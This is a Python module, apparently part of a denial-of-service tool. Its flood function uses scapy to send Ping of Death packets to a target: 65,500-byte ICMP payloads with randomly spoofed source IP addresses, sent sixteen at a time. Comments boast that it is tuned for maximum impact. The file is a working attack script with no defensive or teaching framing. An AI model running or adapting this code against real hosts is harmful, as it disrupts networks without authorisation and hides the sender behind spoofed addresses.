# Import modules
import random
from scapy.all import IP, ICMP, send
import tools.randomData as randomData
from colorama import Fore


# Letters for payload generation
_LETTERS = list("1234567890qwertyuiopasdfghjklzxcvbnm")


def flood(target: tuple[str, int]) -> None:
    """Send Ping of Death packets to target.
    
    Optimized version with better payload generation and increased effectiveness.
    
    Args:
        target: Tuple of (ip_address, port)
    """
    # Increased packet count for maximum impact
    PACKET_COUNT = 16
    
    # Generate optimized payload for maximum impact
    # Using larger payload size for better effect
    payload = random.choice(_LETTERS) * 65500
    packet = IP(dst=target[0], src=randomData.random_IP()) / ICMP(id=65535, seq=65535) / payload

    for _ in range(PACKET_COUNT):
        try:
            send(packet, verbose=False)
        except PermissionError:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
            )
            break
        except OSError as e:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending PoD: {e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}PoD packet ({len(payload)} bytes) sent to {target[0]}{Fore.RESET}"
            )
